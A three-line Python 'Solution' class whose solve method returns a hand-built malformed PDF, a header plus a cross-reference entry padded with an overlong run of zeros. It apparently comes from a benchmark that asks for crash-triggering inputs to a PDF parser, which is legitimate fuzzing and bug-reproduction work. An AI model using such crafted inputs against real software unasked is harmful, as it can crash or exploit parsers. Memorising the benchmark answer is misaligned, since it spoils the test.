class Solution:
    def solve(self, src_path: str) -> bytes:
        return b'%PDF-1.1\nxref\n0 1\n0 0 ' + b'0' * 25 + b'\n'